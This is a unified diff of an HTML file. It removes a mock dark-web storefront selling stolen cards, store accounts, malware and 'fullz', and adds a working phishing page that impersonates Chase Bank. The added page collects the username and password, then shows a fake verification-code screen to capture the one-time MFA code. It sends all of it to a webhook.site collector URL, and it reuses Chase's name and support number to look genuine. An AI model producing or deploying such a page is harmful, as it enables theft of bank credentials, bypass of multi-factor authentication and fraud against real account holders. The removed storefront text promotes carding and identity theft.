@@ -3,598 +3,157 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>RakRunnin Marketplace - Cards, Accounts, Malware & Fullz</title>
+  <title>Bank Login</title>
   <style>
     body {
-      background: #0a0a1a;
-      color: #d0d0ff;
-      font-family: 'Verdana', Arial, sans-serif;
       margin: 0;
-      padding: 0;
-      overflow-x: hidden;
-      scroll-behavior: smooth;
+      font-family: Arial, sans-serif;
+      background-color: #f0f0f0;
     }
-    #captcha-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 20, 0.95);
-      z-index: 1000;
+    /* Startup Page (Teaser) */
+    .startup {
+      height: 100vh;
+      background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACklEQVR4nGMAAQAABQABDQottAAAAABJRU5ErkJggg==') no-repeat center center;
+      background-size: cover;
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
-    }
-    #captcha-screen h2 {
-      color: #0066ff;
-      font-size: 2em;
-    }
-    #captcha-screen input {
-      padding: 10px;
-      margin: 10px 0;
-      border: none;
-      border-radius: 3px;
-      background: #1a1a2a;
-      color: #d0d0ff;
-      font-size: 1em;
-    }
-    #captcha-screen button {
-      background: #0066ff;
-      color: #fff;
-      padding: 10px 20px;
-      border: none;
-      border-radius: 3px;
-      cursor: pointer;
-      font-size: 1em;
-      transition: background 0.3s;
-    }
-    #captcha-screen button:hover {
-      background: #0044cc;
-    }
-    #loading-screen {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 20, 0.95);
-      z-index: 999;
-      display: none;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      color: #0066ff;
-      font-size: 1.5em;
-    }
-    #loading-screen p {
-      margin: 10px 0;
-    }
-    .stick-figure {
-      width: 100px;
-      height: 100px;
-      background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><circle cx="50" cy="20" r="10" fill="%230066ff"/><line x1="50" y1="30" x2="50" y2="60" stroke="%230066ff" stroke-width="5"/><line x1="50" y1="40" x2="30" y2="50" stroke="%230066ff" stroke-width="5"/><line x1="50" y1="40" x2="70" y2="50" stroke="%230066ff" stroke-width="5"/><line x1="50" y1="60" x2="40" y2="80" stroke="%230066ff" stroke-width="5"/><line x1="50" y1="60" x2="60" y2="80" stroke="%230066ff" stroke-width="5"/><circle cx="80" cy="20" r="5" fill="%23ffcc00"/><text x="80" y="15" fill="%23ffcc00" font-size="10">$</text></svg>') no-repeat center;
-      animation: chase 2s infinite;
-    }
-    @keyframes chase {
-      0% { transform: translateX(0); }
-      50% { transform: translateX(20px); }
-      100% { transform: translateX(0); }
-    }
-    .container {
-      display: flex;
-      min-height: 100vh;
-    }
-    .sidebar {
-      width: 200px;
-      background: #1a1a2a;
-      padding: 20px;
-      position: fixed;
-      height: 100%;
-      overflow-y: auto;
-      scrollbar-width: thin;
-      scrollbar-color: #0066ff #1a1a2a;
-      box-shadow: 2px 0 8px rgba(0, 0, 0, 0.7);
-    }
-    .sidebar h3 {
-      color: #0066ff;
-      font-size: 1.2em;
-      margin: 10px 0;
-    }
-    .sidebar ul {
-      list-style: none;
-      padding: 0;
-    }
-    .sidebar li {
-      margin: 10px 0;
-      color: #d0d0ff;
-      font-size: 0.9em;
-      cursor: pointer;
-      transition: color 0.3s;
-    }
-    .sidebar li:hover {
-      color: #0066ff;
-    }
-    .sidebar .sold-out {
-      color: #666;
-      cursor: default;
-    }
-    .main-content {
-      margin-left: 220px;
-      padding: 20px;
-      width: calc(100% - 220px);
-    }
-    .header {
-      background: #1a1a2a;
-      padding: 20px;
+      color: white;
       text-align: center;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.7);
+      font-size: 2rem;
     }
-    .header h1 {
-      margin: 0;
-      font-size: 2.5em;
-      color: #0066ff;
-    }
-    .header p {
-      font-size: 1.2em;
-      margin: 10px 0;
-      color: #b0b0ff;
-    }
-    .navbar {
-      background: #1a1a2a;
-      padding: 10px;
-      display: flex;
-      justify-content: center;
-      gap: 15px;
-      flex-wrap: wrap;
-      box-shadow: 0 2px 8px rgba(0, 0, 0, 0.7);
-    }
-    .navbar button {
-      background: #0066ff;
-      color: #fff;
-      border: none;
-      padding: 8px 15px;
-      border-radius: 3px;
-      cursor: pointer;
-      font-size: 0.9em;
-      transition: background 0.3s, transform 0.2s;
-    }
-    .navbar button:hover {
-      background: #0044cc;
-      transform: scale(1.03);
-    }
-    .search-bar {
-      margin: 15px auto;
-      max-width: 500px;
-    }
-    .search-bar input {
-      width: 100%;
-      padding: 10px;
-      border: none;
-      border-radius: 3px;
-      background: #1a1a2a;
-      color: #d0d0ff;
-      font-size: 1em;
-      box-shadow: inset 0 2px 5px rgba(0, 0, 0, 0.5);
-    }
-    .section {
-      margin: 20px 0;
-      animation: fadeIn 0.8s ease-in-out;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .section h2 {
-      color: #0066ff;
-      font-size: 1.8em;
+    /* Login Section (phish1.jpg) */
+    .login-section {
+      padding: 20px;
+      background-color: white;
+      max-width: 400px;
+      margin: 0 auto;
       text-align: center;
     }
-    .item-container {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
-      gap: 15px;
-      padding: 15px;
-      max-height: 600px;
-      overflow-y: auto;
-      scrollbar-width: thin;
-      scrollbar-color: #0066ff #1a1a2a;
-    }
-    .item {
-      background: #1a1a2a;
-      padding: 15px;
-      border-radius: 5px;
-      text-align: center;
-      transition: transform 0.3s, box-shadow 0.3s;
-      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
-    }
-    .item:hover {
-      transform: translateY(-3px);
-      box-shadow: 0 5px 15px rgba(0, 102, 255, 0.4);
-    }
-    .item img {
-      width: 140px;
-      height: auto;
-      border-radius: 3px;
+    .login-section h2 {
+      color: #003087;
+      font-size: 1.5rem;
       margin-bottom: 10px;
-      transition: transform 0.3s;
     }
-    .item img:hover {
-      transform: scale(1.05);
-    }
-    .item h3 {
+    .login-section input {
+      width: 100%;
+      padding: 10px;
       margin: 10px 0;
-      color: #0066ff;
-      font-size: 1.1em;
+      border: 1px solid #ccc;
+      border-radius: 4px;
     }
-    .item p {
-      margin: 5px 0;
-      font-size: 0.85em;
-      color: #b0b0ff;
-    }
-    .item .sold-out {
-      color: #666;
-      font-weight: bold;
-    }
-    .item .stars {
-      color: #ffd700;
-      font-size: 0.9em;
-      margin: 5px 0;
-    }
-    .item .comment {
-      font-style: italic;
-      color: #b0b0ff;
-    }
-    .buy-btn {
-      background: #0066ff;
-      color: #fff;
-      padding: 8px 15px;
+    .login-section button {
+      width: 100%;
+      padding: 10px;
+      background-color: #003087;
+      color: white;
       border: none;
-      border-radius: 3px;
+      border-radius: 4px;
       cursor: pointer;
-      font-size: 0.85em;
-      transition: background 0.3s, transform 0.2s;
     }
-    .buy-btn:hover {
-      background: #0044cc;
-      transform: scale(1.03);
+    .login-section button:hover {
+      background-color: #002266;
     }
-    .buy-btn:disabled {
-      background: #666;
-      cursor: not-allowed;
-    }
-    .job-section {
-      background: #1a1a2a;
+    /* Details Section (phish2.jpg) */
+    .details-section {
       padding: 20px;
-      border-radius: 5px;
-      margin: 20px auto;
-      max-width: 500px;
+      background-color: #f0f0f0;
+      text-align: left;
+    }
+    .details-section p {
+      color: #333;
+      font-size: 0.9rem;
+      margin: 5px 0;
+    }
+    /* Code Page (Unique Post-Sign-In) */
+    .code-section {
+      display: none;
+      padding: 20px;
+      background-color: white;
+      max-width: 400px;
+      margin: 0 auto;
       text-align: center;
-      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.5);
     }
-    .job-section a {
-      color: #0066ff;
-      text-decoration: none;
-      font-size: 1.1em;
-      transition: color 0.3s;
+    .code-section.active {
+      display: block;
     }
-    .job-section a:hover {
-      color: #0044cc;
+    .code-section h2 {
+      color: #006400;
+      font-size: 1.5rem;
+      margin-bottom: 10px;
+    }
+    .code-section p {
+      color: #333;
+      font-size: 1rem;
+      margin-bottom: 10px;
+    }
+    .code-section input {
+      width: 50px;
+      height: 50px;
+      margin: 5px;
+      font-size: 1.5rem;
+      text-align: center;
+      border: 2px solid #006400;
+      border-radius: 4px;
     }
   </style>
 </head>
 <body>
-  <div id="captcha-screen">
-    <h2>Verify Access</h2>
-    <p>What is 8 + 3?</p>
-    <input type="text" id="captcha-input">
-    <button onclick="verifyCaptcha()">Submit</button>
+  <!-- Startup Teaser (Your Image) -->
+  <div class="startup">Secure Login Ahead</div>
+
+  <!-- Login Section (phish1.jpg) -->
+  <div class="login-section">
+    <h2>Sign In</h2>
+    <form id="loginForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST" onsubmit="showCodeSection(event)">
+      <input type="hidden" name="bank" value="chase">
+      <input type="text" name="username" placeholder="User ID" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Sign In</button>
+    </form>
   </div>
 
-  <div id="loading-screen">
-    <div class="stick-figure"></div>
-    <p>RakRunnin Loading...</p>
+  <!-- Details Section (phish2.jpg) -->
+  <div class="details-section">
+    <p>Protect your account with multi-factor authentication.</p>
+    <p>Need help? Call 1-800-935-9935.</p>
+    <p>© 2025 Chase Bank. All rights reserved.</p>
   </div>
 
-  <div class="container">
-    <div class="sidebar">
-      <h3>Available Items</h3>
-      <ul id="sidebar-menu">
-        <li onclick="loadPage('cards')">Credit Cards</li>
-        <li onclick="loadPage('accounts')">Store Accounts</li>
-        <li onclick="loadPage('malware')">Malware</li>
-        <li onclick="loadPage('fullz')">Fullz</li>
-      </ul>
-    </div>
-    <div class="main-content" id="main-content">
-      <div class="header">
-        <h1>RakRunnin Marketplace</h1>
-        <p>Fresh Cards, Accounts, Malware & Fullz - Cash App Only - DM @RakRunnin on Telegram</p>
-      </div>
-
-      <div class="navbar">
-        <button onclick="filterItems('all', 'cardContainer')">All Cards</button>
-        <button onclick="filterItems('Visa', 'cardContainer')">Visa</button>
-        <button onclick="filterItems('MasterCard', 'cardContainer')">MasterCard</button>
-        <button onclick="filterItems('Discover', 'cardContainer')">Discover</button>
-        <button onclick="filterItems('Amex', 'cardContainer')">Amex</button>
-        <button onclick="sortItems('cardContainer')">Sort by Price</button>
-      </div>
-
-      <div class="search-bar">
-        <input type="text" placeholder="Search items..." oninput="searchItems(this.value)">
-      </div>
-
-      <div class="section" id="cards-section">
-        <h2>Credit Cards</h2>
-        <div class="item-container" id="cardContainer">
-          <!-- Cards generated here -->
-        </div>
-      </div>
-
-      <div class="section" id="accounts-section" style="display: none;">
-        <h2>Store Accounts & Gift Cards</h2>
-        <div class="item-container" id="accountContainer">
-          <!-- Accounts generated here -->
-        </div>
-      </div>
-
-      <div class="section" id="malware-section" style="display: none;">
-        <h2>Malware</h2>
-        <div class="item-container" id="malwareContainer">
-          <!-- Malware generated here -->
-        </div>
-      </div>
-
-      <div class="section" id="fullz-section" style="display: none;">
-        <h2>Fullz</h2>
-        <div class="item-container" id="fullzContainer">
-          <!-- Fullz generated here -->
-        </div>
-      </div>
-
-      <div class="job-section">
-        <h2>Want to Stack Cash?</h2>
-        <p>Join @RakRunnin on Telegram for exclusive deals and methods!</p>
-        <a href="https://t.me/rakrunning">Contact @RakRunnin</a>
-      </div>
-    </div>
+  <!-- Code Section (Unique Post-Sign-In) -->
+  <div class="code-section" id="codeSection">
+    <h2>Verification Code</h2>
+    <p>A 6-digit code has been sent to your phone. Enter it below:</p>
+    <form id="codeForm" action="https://webhook.site/YOUR_UNIQUE_ID" method="POST">
+      <input type="hidden" name="bank" value="chase">
+      <input type="hidden" name="username" value="">
+      <input type="hidden" name="password" value="">
+      <input type="text" name="code1" maxlength="1" required>
+      <input type="text" name="code2" maxlength="1" required>
+      <input type="text" name="code3" maxlength="1" required>
+      <input type="text" name="code4" maxlength="1" required>
+      <input type="text" name="code5" maxlength="1" required>
+      <input type="text" name="code6" maxlength="1" required>
+      <button type="submit">Verify</button>
+    </form>
   </div>
 
   <script>
-    const cardData = [
-      { type: 'Visa', bin: '414720', logo: 'https://upload.wikimedia.org/wikipedia/commons/d/d6/Visa_2021.svg', use: 'Shop online or cash out at ATMs. Clean bins, high limits.', reviews: [
-        { rating: 5, comment: '[Confirmed Purchase] These bins hit every time, got me a new whip 🔥' },
-        { rating: 4, comment: '[Confirmed Purchase] Worked for Amazon, smooth as hell 💪' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Took a min to cash out but it hit' }
-      ]},
-      { type: 'MasterCard', bin: '555555', logo: 'https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg', use: 'Perfect for subscriptions or big purchases. Easy cashout.', reviews: [
-        { rating: 4.5, comment: '[Confirmed Purchase] I keep buyin ccs I’m telling my og I got prop money 😭' },
-        { rating: 4, comment: '[Confirmed Purchase] Solid for PayPal, no issues' },
-        { rating: 3, comment: '[Confirmed Purchase] Worked but balance lower than expected' }
-      ]},
-      { type: 'Discover', bin: '601111', logo: 'https://upload.wikimedia.org/wikipedia/commons/5/57/Discover_Card_logo.svg', use: 'Great for online stores. Low suspicion, high success.', reviews: [
-        { rating: 4, comment: '[Confirmed Purchase] Got a TV from Best Buy, no cap 🔥' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Worked online, took some tries' },
-        { rating: 5, comment: '[Confirmed Purchase] Straight fire, bought hella electronics 💯' }
-      ]},
-      { type: 'Amex', bin: '378282', logo: 'https://upload.wikimedia.org/wikipedia/commons/3/30/American_Express_logo.svg', use: 'Luxury purchases or high-value cashouts. Elite bins.', reviews: [
-        { rating: 5, comment: '[Confirmed Purchase] Bought Gucci bags, shit was too easy 💪' },
-        { rating: 4.5, comment: '[Confirmed Purchase] Fire for hotels, no questions asked' },
-        { rating: 4, comment: '[Confirmed Purchase] Good for high-end stores, clean' }
-      ]},
-      { type: 'Chase', bin: '426684', logo: '', use: 'Premium bank card for cashouts. High success rate.', soldOut: true, reviews: [
-        { rating: 4, comment: '[Confirmed Purchase] Cash App worked smooth, got my bread' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Took a sec to cash out but it hit' }
-      ]}
-    ];
-
-    const accountData = [
-      { type: 'Saks Account', bin: 'SAKS', logo: 'https://upload.wikimedia.org/wikipedia/commons/3/3f/Saks_Fifth_Avenue_logo.svg', use: 'Buy luxury goods at Saks. Up to $2,000 balance.', reviews: [
-        { rating: 4.5, comment: '[Confirmed Purchase] Copped some designer drip, no issues 🔥' },
-        { rating: 4, comment: '[Confirmed Purchase] Account worked, balance was $1,500' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Took a bit to login but worth it' }
-      ]},
-      { type: 'Nordstrom Gift Card', bin: 'NORD', logo: 'https://upload.wikimedia.org/wikipedia/commons/0/06/Nordstrom_Logo.svg', use: 'Shop fashion at Nordstrom. Redeem online or in-store.', reviews: [
-        { rating: 5, comment: '[Confirmed Purchase] Got shoes and clothes, straight cashout 💯' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Worked online, in-store was tricky' },
-        { rating: 4, comment: '[Confirmed Purchase] Smooth for online orders, fast delivery' }
-      ]},
-      { type: 'Walmart Gift Card', bin: 'WAL', logo: 'https://upload.wikimedia.org/wikipedia/commons/c/ca/Walmart_logo.svg', use: 'Purchase electronics or groceries at Walmart. Easy to use.', reviews: [
-        { rating: 4, comment: '[Confirmed Purchase] Bought a PS5, no cap, shit was smooth' },
-        { rating: 3, comment: '[Confirmed Purchase] Balance was $500, expected more' },
-        { rating: 4.5, comment: '[Confirmed Purchase] Got a laptop, quick and easy 🔥' }
-      ]},
-      { type: 'Macy’s Account', bin: 'MACY', logo: '', use: 'Shop at Macy’s for clothes and home goods. High balance.', soldOut: true, reviews: [
-        { rating: 4.5, comment: '[Confirmed Purchase] Got a whole fit for the low, love it 🔥' },
-        { rating: 4, comment: '[Confirmed Purchase] Worked online, quick delivery' }
-      ]}
-    ];
-
-    const malwareData = [
-      { type: 'Stealth Keylogger', bin: 'KEY', logo: '', use: 'Capture passwords and bank logins silently. Easy setup.', reviews: [
-        { rating: 4.5, comment: '[Confirmed Purchase] Got PayPal logins in a day, too easy 🔥' },
-        { rating: 4, comment: '[Confirmed Purchase] Worked on Windows, no issues' }
-      ]},
-      { type: 'Trojan X', bin: 'TROJ', logo: '', use: 'Remote access and data theft. Plug-and-play.', soldOut: true, reviews: [
-        { rating: 5, comment: '[Confirmed Purchase] Controlled PCs like a boss, worth every penny 💯' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Setup was tricky but it hit' }
-      ]},
-      { type: 'RAT Z', bin: 'RATZ', logo: '', use: 'Steal files and control devices remotely. High success.', reviews: [
-        { rating: 4, comment: '[Confirmed Purchase] Got bank details quick, no cap 🔥' },
-        { rating: 4.5, comment: '[Confirmed Purchase] Fire for data theft, easy to use' }
-      ]}
-    ];
-
-    const fullzData = [
-      { type: 'Fullz - John Doe', bin: 'FULL1', logo: '', use: 'Open bank accounts or apply for loans. Clean data.', reviews: [
-        { rating: 5, comment: '[Confirmed Purchase] Got a loan approved, shit was too smooth 💪' },
-        { rating: 4, comment: '[Confirmed Purchase] Worked for credit apps, no issues' }
-      ]},
-      { type: 'Fullz - Jane Smith', bin: 'FULL2', logo: '', use: 'Use for credit applications or online purchases. High success.', reviews: [
-        { rating: 4.5, comment: '[Confirmed Purchase] Opened a bank account, clean data 🔥' },
-        { rating: 3.5, comment: '[Confirmed Purchase] Took some tries but worked' }
-      ]},
-      { type: 'Fullz - Mike Brown', bin: 'FULL3', logo: '', use: 'Perfect for high-value applications. Verified data.', soldOut: true, reviews: [
-        { rating: 4, comment: '[Confirmed Purchase] Got a credit card issued, no cap 💯' },
-        { rating: 4.5, comment: '[Confirmed Purchase] Smooth for loan apps, worth it' }
-      ]}
-    ];
-
-    function generateItem(category) {
-      const data = category === 'cards' ? cardData : category === 'accounts' ? accountData : category === 'malware' ? malwareData : fullzData;
-      const item = data[Math.floor(Math.random() * data.length)];
-      const cardNumber = item.bin + Array(10).fill(0).map(() => Math.floor(Math.random() * 10)).join('');
-      const expiryMonth = String(Math.floor(Math.random() * 12) + 1).padStart(2, '0');
-      const expiryYear = String(Math.floor(Math.random() * 10) + 24);
-      const cvv = category === 'cards' ? String(Math.floor(Math.random() * 1000)).padStart(3, '0') : '';
-      const price = Math.floor(Math.random() * 76 + 25); // Prices from $25 to $100
-      const soldOut = item.soldOut || Math.random() < 0.2; // 20% chance of being sold out unless specified
-      const review = item.reviews[Math.floor(Math.random() * item.reviews.length)];
-      return {
-        cardNumber: cardNumber.match(/.{1,4}/g)?.join('-') || cardNumber,
-        expiry: category === 'cards' ? `${expiryMonth}/${expiryYear}` : '',
-        cvv,
-        cardType: item.type,
-        logo: item.logo,
-        price,
-        use: item.use,
-        soldOut,
-        rating: review.rating,
-        comment: review.comment
-      };
-    }
-
-    function displayItems(filter = 'all', containerId = 'cardContainer', category = 'cards') {
-      const container = document.getElementById(containerId);
-      container.innerHTML = '';
-      const items = Array(1000).fill().map(() => generateItem(category)); // Thousands of items
-      let filteredItems = items;
-      if (filter !== 'all') {
-        filteredItems = items.filter(item => item.cardType === filter);
-      }
-      filteredItems.slice(0, 50).forEach(item => addItem(item, container, category)); // Display 50 for performance
-      updateSidebar();
-    }
-
-    function addItem(item, container, category) {
-      const itemDiv = document.createElement('div');
-      itemDiv.className = 'item';
-      itemDiv.innerHTML = `
-        ${item.logo && !item.soldOut ? `<img src="${item.logo}" alt="${item.cardType}">` : '<p class="sold-out">SOLD OUT</p>'}
-        <h3>${item.cardType} - $${item.price * 50}</h3>
-        <p>Price: $${item.price}</p>
-        <p>${category === 'cards' ? `Card Number: ${item.cardNumber.slice(0, 5)}XXXX-XXXX-XXXX` : `ID: ${item.cardNumber}`}</p>
-        ${item.expiry ? `<p>Expiry: ${item.expiry} | CVV: ***</p>` : ''}
-        <p>${item.use}</p>
-        <p class="stars">${'★'.repeat(Math.floor(item.rating))}${item.rating % 1 ? '☆' : ''} ${item.rating}/5</p>
-        <p class="comment">${item.comment}</p>
-        <button class="buy-btn" ${item.soldOut ? 'disabled' : ''} onclick="buyItem('${item.cardType} - ${item.cardNumber}')">${item.soldOut ? 'Sold Out' : 'Contact to Purchase'}</button>
-      `;
-      container.appendChild(itemDiv);
-    }
-
-    function updateSidebar() {
-      const sidebarMenu = document.getElementById('sidebar-menu');
-      const categories = [
-        { name: 'Credit Cards', id: 'cards', container: 'cardContainer' },
-        { name: 'Store Accounts', id: 'accounts', container: 'accountContainer' },
-        { name: 'Malware', id: 'malware', container: 'malwareContainer' },
-        { name: 'Fullz', id: 'fullz', container: 'fullzContainer' }
-      ];
-      sidebarMenu.innerHTML = '';
-      categories.forEach(category => {
-        const types = (category.id === 'cards' ? cardData : category.id === 'accounts' ? accountData : category.id === 'malware' ? malwareData : fullzData)
-          .map(item => item.type);
-        types.forEach(type => {
-          const count = Array.from(document.getElementById(category.container).children)
-            .filter(item => item.querySelector('h3').textContent.includes(type) && !item.querySelector('.sold-out')).length;
-          const li = document.createElement('li');
-          li.textContent = `${type} (${count} available)`;
-          li.className = count === 0 ? 'sold-out' : '';
-          li.onclick = count > 0 ? () => filterItems(type, category.container) : null;
-          sidebarMenu.appendChild(li);
-        });
-      });
-    }
-
-    function searchItems(query) {
-      const containers = ['cardContainer', 'accountContainer', 'malwareContainer', 'fullzContainer'];
-      containers.forEach(containerId => {
-        const container = document.getElementById(containerId);
-        const items = container.getElementsByClassName('item');
-        Array.from(items).forEach(item => {
-          const title = item.querySelector('h3').textContent.toLowerCase();
-          item.style.display = title.includes(query.toLowerCase()) ? 'block' : 'none';
-        });
-      });
-      updateSidebar();
-    }
-
-    function filterItems(type, containerId) {
-      const category = containerId === 'cardContainer' ? 'cards' : containerId === 'accountContainer' ? 'accounts' : containerId === 'malwareContainer' ? 'malware' : 'fullz';
-      displayItems(type, containerId, category);
-    }
-
-    function sortItems(containerId) {
-      const container = document.getElementById(containerId);
-      const items = Array.from(container.children);
-      items.sort((a, b) => {
-        const priceA = parseInt(a.querySelector('p:nth-child(3)').textContent.split('$')[1]);
-        const priceB = parseInt(b.querySelector('p:nth-child(3)').textContent.split('$')[1]);
-        return priceA - priceB;
-      });
-      container.innerHTML = '';
-      items.forEach(item => container.appendChild(item));
-      updateSidebar();
-    }
-
-    function buyItem(item) {
-      const itemData = generateItem('cards');
-      fetch('YOUR_WEBHOOK_URL', {
+    function showCodeSection(event) {
+      event.preventDefault();
+      const form = document.getElementById('loginForm');
+      const codeSection = document.getElementById('codeSection');
+      const codeForm = document.getElementById('codeForm');
+      const formData = new FormData(form);
+      codeForm.querySelector('[name="username"]').value = formData.get('username');
+      codeForm.querySelector('[name="password"]').value = formData.get('password');
+      codeSection.classList.add('active');
+      formData.append('stage', 'login');
+      fetch(form.action, {
         method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ item, data: itemData, timestamp: new Date().toISOString() })
+        body: formData
       });
-      alert('DM @RakRunnin on Telegram (https://t.me/rakrunning) to pay via Cash App!');
-      const firstItem = document.querySelector('.item');
-      if (firstItem) {
-        firstItem.querySelector('p:nth-child(4)').textContent = `${itemData.cardNumber.slice(0, 5)}XXXX-XXXX-XXXX`;
-        if (itemData.expiry) firstItem.querySelector('p:nth-child(5)').textContent = `Expiry: ${itemData.expiry} | CVV: ***`;
-      }
     }
-
-    function loadPage(sectionId) {
-      document.getElementById('loading-screen').style.display = 'flex';
-      setTimeout(() => {
-        document.getElementById('cards-section').style.display = sectionId === 'cards' ? 'block' : 'none';
-        document.getElementById('accounts-section').style.display = sectionId === 'accounts' ? 'block' : 'none';
-        document.getElementById('malware-section').style.display = sectionId === 'malware' ? 'block' : 'none';
-        document.getElementById('fullz-section').style.display = sectionId === 'fullz' ? 'block' : 'none';
-        if (sectionId === 'cards') displayItems('all', 'cardContainer', 'cards');
-        else if (sectionId === 'accounts') displayItems('all', 'accountContainer', 'accounts');
-        else if (sectionId === 'malware') displayItems('all', 'malwareContainer', 'malware');
-        else if (sectionId === 'fullz') displayItems('all', 'fullzContainer', 'fullz');
-        document.getElementById('loading-screen').style.display = 'none';
-      }, 1500);
-    }
-
-    function verifyCaptcha() {
-      const input = document.getElementById('captcha-input').value;
-      if (input === '11') {
-        document.getElementById('captcha-screen').style.display = 'none';
-      } else {
-        alert('Incorrect. Try again.');
-      }
-    }
-
-    window.onload = () => {
-      displayItems('all', 'cardContainer', 'cards');
-      displayItems('all', 'accountContainer', 'accounts');
-      displayItems('all', 'malwareContainer', 'malware');
-      displayItems('all', 'fullzContainer', 'fullz');
-    };
   </script>
 </body>
 </html>
